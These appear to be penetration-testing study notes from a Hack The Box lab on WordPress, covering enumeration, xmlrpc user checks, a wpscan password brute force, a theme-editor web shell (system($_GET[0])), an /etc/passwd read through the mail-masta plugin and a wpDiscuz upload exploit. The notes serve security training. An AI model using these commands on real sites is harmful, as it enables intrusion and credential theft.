##### General Information
```
L3pr3ch4un@htb[/htb]$ tree -L 1 /var/www/html
.
├── index.php
├── license.txt
├── readme.html
├── wp-activate.php
├── wp-admin
├── wp-blog-header.php
├── wp-comments-post.php
├── wp-config.php
├── wp-config-sample.php
├── wp-content
├── wp-cron.php
├── wp-includes
├── wp-links-opml.php
├── wp-load.php
├── wp-login.php
├── wp-mail.php
├── wp-settings.php
├── wp-signup.php
├── wp-trackback.php
└── xmlrpc.php
```

| File/Directory  | Description                                                                                                                                                                                                      |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| index.php       | Homepage of WordPress.                                                                                                                                                                                           |
| license.txt     | Contains useful information such as the version of WordPress installed.                                                                                                                                          |
| wp-activate.php | Used for the email activation process when setting up a new WordPress site.                                                                                                                                      |
| wp-admin        | Folder containing the login page for administrator access and the backend dashboard. Login paths: /wp-admin/login.php, /wp-admin/wp-login.php, /login.php, /wp-login.php. This file can be renamed for security. |
| xmlrpc.php      | File representing a feature of WordPress that enables data transmission using HTTP and XML. Replaced by the WordPress REST API.                                                                                  |
| wp-config.php   | Configuration file containing database connection details, authentication keys, salts, and other settings. Can activate DEBUG mode for troubleshooting.                                                          |
| wp-content      | Main directory for storing plugins and themes. The uploads/ subdirectory typically stores uploaded files.                                                                                                        |
| wp-includes     | Directory containing core files such as certificates, fonts, JavaScript files, and widgets. Excludes administrative components and themes.                                                                       |

| Role          | Description                                                                                                                                            |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Administrator | This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code. |
| Editor        | An editor can publish and manage posts, including the posts of other users.                                                                            |
| Author        | Authors can publish and manage their own posts.                                                                                                        |
| Contributor   | These users can write and manage their own posts but cannot publish them.                                                                              |
| Subscriber    | These are normal users who can browse posts and edit their profiles.                                                                                   |

#### Enumeration

**Version Fingerprinting**

```
# Wordpress version
L3pr3ch4un@htb[/htb]$ curl -s -X GET http://ir.inlanefreight.com | grep '<meta name="generator"'

# Search for JavaScript files with version parameters
curl -s https://your-wordpress-site.com | grep -Eo 'src="[^"]+\.js\?ver=[^"]+"'

# Search for CSS files with version parameters
curl -s https://your-wordpress-site.com | grep -Eo 'href="[^"]+\.css\?ver=[^"]+"'
```

**Themes and Plugins**
```
# Plugins
`L3pr3ch4un@htb[/htb]$ curl -s -X GET http://ir.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2`

# Themes
`L3pr3ch4un@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2`


`L3pr3ch4un@htb[/htb]$ curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta`
```
If the content does not exist, we will receive a 404 Not Found error.

**Directory indexing**

`L3pr3ch4un@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text`

**Wpscan**

`L3pr3ch4un@htb[/htb]$ sudo wpscan --url http://ir.inlanefreight.local --enumerate --api-token dEOFB<SNIP>`

**Xmlrpc**
`[!bash!]$ curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://ir.inlanefreight.local/xmlrpc.php`


**Enumerate Users**

`L3pr3ch4un@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php`

`wpscan –url http://example.com –enumerate u`
Api:*/wp-json/wp/v2/users*

**Password Brute force**

`L3pr3ch4un@htb[/htb]$ sudo wpscan --password-attack xmlrpc -t 20 -U ilfreightwp -P /usr/share/wordlists/rockyou.txt --url http://ir.inlanefreight.local`

**Code Execution**

> [!NOTE] Use Alternative theme like  Twenty Nineteen
> To prevent disruption in working of website it is recommended to use another theme that is not currently in use.

`Appearence`>`Theme Editor`>`404.php`>`system($_GET[0]);`

```
L3pr3ch4un@htb[/htb]$ curl http://10.10.110.100/wp-content/themes/twentynineteen/404.php?0=id
```
`msf6 > use exploit/unix/webapp/wp_admin_shell_upload`

### Vulnerabilities

> [!NOTE] Web Archive comes handy!
> We can use the waybackurls tool to look for older versions of a target site using the Wayback Machine. Sometimes we may find a previous version of a WordPress site using a plugin that has a known vulnerability. If the plugin is no longer in use but the developers did not remove it properly, we may still be able to access the directory it is stored in and exploit a flaw.

**Vulnerable Plugins - mail-masta**

`L3pr3ch4un@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`

**Vulnerable Plugins - wpDiscuz**

`version number (7.0.4)`

https://www.exploit-db.com/exploits/49967

`L3pr3ch4un@htb[/htb]$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1`

`L3pr3ch4un@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id`

